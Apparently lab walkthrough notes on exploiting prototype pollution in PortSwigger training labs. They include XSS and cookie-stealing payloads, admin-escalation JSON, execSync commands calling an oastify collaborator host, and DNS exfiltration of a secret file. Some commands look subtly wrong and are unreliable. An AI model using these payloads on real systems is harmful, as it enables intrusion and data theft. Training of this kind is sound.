# Prototype Pollution
Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

## What is a prototype in JavaScript?
Every object in JavaScript is linked to another object of some kind, known as its prototype. By default, JavaScript automatically assigns new objects one of its built-in prototypes. For example, strings are automatically assigned the built-in String.prototype. You can see some more examples of these global prototypes below:

    let myObject = {};
    Object.getPrototypeOf(myObject);    // Object.prototype

    let myString = "";
    Object.getPrototypeOf(myString);    // String.prototype

    let myArray = [];
    Object.getPrototypeOf(myArray);	    // Array.prototype

    let myNumber = 1;
    Object.getPrototypeOf(myNumber);    // Number.prototype

Objects automatically inherit all of the properties of their assigned prototype, unless they already have their own property with the same key. This enables developers to create new objects that can reuse the properties and methods of existing objects.

## Detecting server-side prototype pollution without polluted property reflection
[Link](https://portswigger.net/research/server-side-prototype-pollution)

### LAB: DOM XSS via client-side prototype pollution1. Open the lab in Burp's built-in browser.
1. Enable `DOM Invader` and enable the prototype pollution option.
1. Open the browser `DevTools` panel, go to the `DOM Invader` tab, then reload the page.
1. Observe that `DOM Invader` has identified two prototype pollution vectors in the search property i.e. the query string.
1. Click `Scan for gadgets`. A new tab opens in which `DOM Invader` begins scanning for gadgets using the selected source.
1. When the scan is complete, open the `DevTools` panel in the same tab as the scan, then go to the `DOM Invader` tab.
1. Observe that `DOM Invader` has successfully accessed the `script.src` sink via the `transport_url` gadget.
1. Click Exploit. `DOM Invader` automatically generates a proof-of-concept exploit and calls `alert(1)`.

### LAB: DOM XSS via an alternative prototype pollution vector
Same as above lab but now the exploit is not triggering because `1` is appended to the `manager.sequence`. To bypass that, simply add a `-` to the exploit payload:

    ?__proto__.sequence=alert%281%29-

### LAB: Client-side prototype pollution via flawed sanitization
Use DOM Invader to solve this lab using:

    /?__pro__proto__to__[transport_url]=data%3A%2Calert%281%29

### LAB: Client-side prototype pollution in third-party libraries
Use DOM Invader to find prototype pollution payload. Modify it to meet the lab's requirement and send this to the victim:

    <script>
        window.location="https://0a6200d004b7a84281d74daf003600f2.web-security-academy.net/#__proto__[hitCallback]=alert%28document.cookie%29"
    </script>

### LAB: Client-side prototype pollution via browser APIs
> **Base on this example:** 
> If you use prototype pollution on the value property, then you can overwrite "property" even though it's been configured as not writable:

    Object.prototype.value='overwritten';
    let myObject = {property: "Existing property value"};
    Object.defineProperty(myObject,'property', {configurable:false,writable:false});
    alert(myObject.property);//overwritten!
> So even though the property has been made unconfigurable and unwritable, by using a prototype pollution source we can poison the descriptor used by `Object.defineProperty` to overwrite the property value. This is because if you don't specify a "value" property on the descriptor then the JavaScript engine uses the `Object.prototype`.

To solve this lab, use this payload:

    /?__proto__[value]=data:,alert(1);

### LAB: Privilege escalation via server-side prototype pollution
Notice the server updates the object via the POST request to `/my-account/change-address`. Notice the `isAdmin` property in the response. Try polluting the global `Object.prototype` with an arbitrary property as follows: 

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "t4JuEbXiKSFUOxGggk2HXTWGeGtghU8t",
        "__proto__": {
            "isAdmin": true
        }
    }

Send the request, notice the `isAdmin` property is set to `true`. We are now able to access the admin panel and delete Carlos.

### LAB: Detecting server-side prototype pollution without polluted property reflection
Notice the server updates the object via the POST request to `/my-account/change-address`. Try sending an invalid JSON format body. Notice the server is returning an error object with a `status` property. Try pollute this by sending this as the body:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "sZDKqYGKmy2O2I39RSOOZ2aJy1SHLxsy",
        "__proto__": {
            "status": 411  // custom status code
        }
    }

Notice the status is reflected in the response:

    "error":{"status":411}

Now resend the invalid format JSON, notice the status code is exactly our custom one:

    {
        "error": {
            "expose": true,
            "statusCode": 411,
            "status": 411,
            "body": "{,}",
            "type": "entity.parse.failed"
        }
    }

### LAB: Bypassing flawed input filters for server-side prototype pollution
Try sending this as the body to `/my-account/change-address`:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "CJRV1tSvUfuNnxa5UXyoxqmKJ7LnHYbx",
        "__proto__": {
            "json spaces":10
        }
    }

Notice the `__proto__` keyword has been filtered by the server because the identation is not changed. Because `myObject.constructor.prototype` is equivalent to `myObject.__proto__` try sending this body:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "CJRV1tSvUfuNnxa5UXyoxqmKJ7LnHYbx",
        "constructor": {
            "prototype": {
                json spaces":10
            }
        }
    }

Now the response has the correct identation as we specified, indicating a prototype pollution vulnerability. This time send this body to successfully escalate the privilege and delete Carlos:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "CJRV1tSvUfuNnxa5UXyoxqmKJ7LnHYbx",
        "constructor": {
            "prototype": { 
                "isAdmin": true 
            }
        }
    }

### LAB: Remote code execution via server-side prototype pollution
Found that `/my-account/change-address` is vulnerable to prototype pollution, send this the request with this body:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "BT6cFDohs56k0GoEGP4xRXwFF2RY1SHK",
        "__proto__": {
            "execArgv": [
            "--eval=require('child_process').execSync('curl https://kzn4ftgcclackeaamiwn2p1ndej57xvm.oastify.com')"
            ]
        }
    }

Send the `POST /admin/jobs HTTP/2` to spawn node child process which execute the OS command. Notice the HTTP request coming to our Collaborator, indicating a successfull RCE. Now redo the process but with this body for the `POST /my-account/change-address HTTP/2` request to solve the lab:

    {
        "address_line_1": "Wiener HQ",
        "address_line_2": "One Wiener Way",
        "city": "Wienerville",
        "postcode": "BU1 1RP",
        "country": "UK",
        "sessionId": "BT6cFDohs56k0GoEGP4xRXwFF2RY1SHK",
        "__proto__": {
            "execArgv": [
            "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
            ]
        }
    }
### LAB: Exfiltrating sensitive data via server-side prototype pollution
Send the `POST /my-account/change-address HTTP/2` request to `Repeater`. Try pollute the prototype by adding this to the body:

    "__proto__": {
        "json spaces": 10
    }

Notice the indention of the returned object viewed in raw is changed which indicates a successfull prototype pollution. Now change the body to include this:

    "__proto__": {
        "shell": "vim",
        "input": ":! cat $(/home/carlos).hpa7lspiffwu453o0k2zy1xtuk0bo1cq.oastify.com \n"
    }

This payload will use Vim as an interactive prompt and execute the command passed in `input` (the `\n` is neccessary because in Vim the user needs to hit `Enter` to run the provided command). Now send the `POST /admin/jobs HTTP/2` request to execute the shell command. Notice in the `Collaborator` tab, there are DNS requests to:

    secret.hpa7lspiffwu453o0k2zy1xtuk0bo1cq.oastify.com

This indicates that there is a file named `secret` in `/home/carlos`. Now change the shell command to:

    :! ls $(/home/carlos/secret).hpa7lspiffwu453o0k2zy1xtuk0bo1cq.oastify.com \n

Resend the `POST /admin/jobs HTTP/2` request to execute the shell command. Notice in the `Collaborator` tab, there are DNS requests to:

    W0h4Feu25FyPUB4rD59u8VUlaHZKZ2sm.hpa7lspiffwu453o0k2zy1xtuk0bo1cq.oastify.com

This gives us the content of `secret`:

    W0h4Feu25FyPUB4rD59u8VUlaHZKZ2sm